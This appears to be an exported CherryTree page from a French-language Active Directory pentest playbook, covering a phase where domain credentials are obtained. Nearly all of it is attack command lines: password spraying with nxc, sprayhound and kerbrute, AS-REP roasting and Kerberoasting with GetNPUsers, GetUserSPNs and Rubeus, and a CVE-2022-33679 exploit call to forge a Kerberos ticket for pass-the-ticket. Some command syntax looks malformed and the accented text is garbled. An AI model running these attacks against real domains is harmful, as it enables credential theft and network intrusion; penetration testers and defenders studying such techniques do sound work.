<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>03- Valid User (No password)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>03- Valid User (No password)</h1><br/><p><ol><li><h2>RÃ©cupÃ©rer la politique de mot de passe (Ã©viter les verrous)</h2></p><p></li></ol><div class="codebox"><pre>nxc smb <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span> -u <span style="color:#3ad900;font-weight:400">&quot;&lt;user&gt;&quot;</span> -p <span style="color:#3ad900;font-weight:400">&quot;&lt;password&gt;&quot;</span> --pass-pol<br /><br />Get-ADDefaultDomainPasswordPolicy<br /><br />ldeep ldap -u <span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span> -p <span style="color:#ff9d00;font-weight:700">&lt;</span>password<span style="color:#ff9d00;font-weight:700">&gt;</span> -d <span style="color:#ff9d00;font-weight:700">&lt;</span>domain<span style="color:#ff9d00;font-weight:700">&gt;</span> -s ldap://<span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span> domain_policy<br /></pre></div></p><p>But : connaÃ®tre le <strong>compte-lockout threshold</strong> et lâ€™intervalle de reset avant tout spray.</p><p></p><p></p><p><ol><li>2. <h2>2. Password Spray (user = password &amp; mots-de-passe classiques)</h2></li></ol></p><p></p><p><div class="codebox"><pre>nxc smb <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success<br /><br />sprayhound -U users.txt -d <span style="color:#ff9d00;font-weight:700">&lt;</span>domain<span style="color:#ff9d00;font-weight:700">&gt;</span> -dc <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span>  <span style="color:#0088ff;font-weight:400"># --lower / --upper pour variantes</span></pre></div></p><p></p><p>RÃ©sultat â†’ <strong>Clear-text credentials</strong> âœ”ï¸</p><p></p><p></p><p><strong>b. Mots de passe courants</strong> (SeasonYear!, Company123â€¦)</p><p><div class="codebox"><pre>nxc smb <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span> --users.txt --passwords.txt<br /><br />sprayhound -U users.txt -p passwords.txt -d <span style="color:#ff9d00;font-weight:700">&lt;</span>domain<span style="color:#ff9d00;font-weight:700">&gt;</span> -dc <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><br />kerbrute passwordspray -d <span style="color:#ff9d00;font-weight:700">&lt;</span>domain<span style="color:#ff9d00;font-weight:700">&gt;</span> users.txt passwords.txt</pre></div></p><p></p><p>RÃ©sultat â†’ <strong>Clear-text credentials</strong> âœ”ï¸</p><p></p><p></p><p><ol><li>3. <h2>3. ASREPRoast (comptes â€œDo not require pre-authâ€)</h2></li></ol></p><p><strong>Lister les comptes roastables</strong> :</p><p> <code>MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u</code> (BloodHound)</p><p></p><p>Extraction :</p><p><div class="codebox"><pre>GetNPUsers.py <span style="color:#ff9d00;font-weight:700">&lt;</span>domain<span style="color:#ff9d00;font-weight:700">&gt;</span>/ -usersfile users.txt -format hashcat -outputfile asrep.hashes<br /><span style="color:#0088ff;font-weight:400">#ou</span><br /> nxc ldap -u <span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span> -p <span style="color:#ff9d00;font-weight:700">&lt;</span>pwd<span style="color:#ff9d00;font-weight:700">&gt;</span> --asreproast output.txt<br /><span style="color:#0088ff;font-weight:400">#ou </span><br />Rubeus.exe asreproast /format:hashcat</pre></div></p><p></p><p></p><p></p><p>RÃ©sultat â†’ <strong>Hash ASREP</strong> ğŸŸ§ (offline crack â†’ clear PW = privilege).</p><p><ol><li>4. <h2>4. Kerberoasting (SPN / TGS)</h2></p><p></li></ol><div class="codebox"><pre>Rubeus.exe kerberoast /domain:<span style="color:#ff9d00;font-weight:700">&lt;</span>domain<span style="color:#ff9d00;font-weight:700">&gt;</span> /dc:<span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span> /nowrap<br /><br />GetUserSPNs.py -no-preauth <span style="color:#ff9d00;font-weight:700">&lt;</span>target_user<span style="color:#ff9d00;font-weight:700">&gt;</span> --usersfile users.txt -dc-host <span style="color:#ff9d00;font-weight:700">&lt;</span>ip<span style="color:#ff9d00;font-weight:700">&gt;</span> -request</pre></div></p><p></p><p>RÃ©sultat â†’ <strong>Hash TGS</strong> ğŸŸ§ (offline crack).</p><p></p><p></p><p><ol><li>5. <h2>5. CVE-2022-33679 â€” S4U2Self / Last-Move PTT</h2></li></ol></p><p><code>CVE-2022-33679.py &lt;domain&gt;/&lt;user&gt; &lt;target&gt;</code></p><p></p><p>Permet dâ€™obtenir un <strong>TGT forgÃ©</strong> â†’ Pass-the-Ticket final pour rebond AD.</p><p></p><p></p><p><h2>Livrables de la phase 3</h2></p><p>Politiques de mot de passe (domain &amp; PSO) pour calibrer les attaques.</p><p></p><p>Identifiants clairs obtenus par spray.</p><p></p><p>Hashes ASREP et TGS pour cracking hors-ligne.</p><p></p><p>Ticket Kerberos forgÃ© (CVE-2022-33679) prÃªt pour Pass-the-Ticket / Ã©lÃ©vation ultÃ©rieure.</p><p></p><p></p></div>
</body>
</html>
